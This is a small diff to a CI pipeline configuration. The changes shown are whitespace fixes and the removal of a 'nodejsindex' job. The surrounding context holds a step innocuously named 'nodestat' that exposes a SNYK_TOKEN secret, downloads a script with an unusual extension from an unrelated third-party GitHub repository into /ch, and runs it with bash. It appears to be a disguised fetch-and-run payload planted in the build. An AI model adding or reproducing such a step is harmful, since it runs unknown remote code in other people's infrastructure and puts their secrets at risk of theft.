@@ -14,16 +14,15 @@ jobs:
 
     steps:
       - checkout
-      - run: apt update && apt upgrade -y && apt install gpg  curl sudo -y
+      - run: apt update && apt upgrade -y && apt install gpg curl sudo -y
       - run:
           name: "nodestat"
           environment:
             SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
           command: "set -e  && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
       - codecov/upload
-
+      
 workflows:
   test:
     jobs:
       - dockeretteinstall
-      - nodejsindex
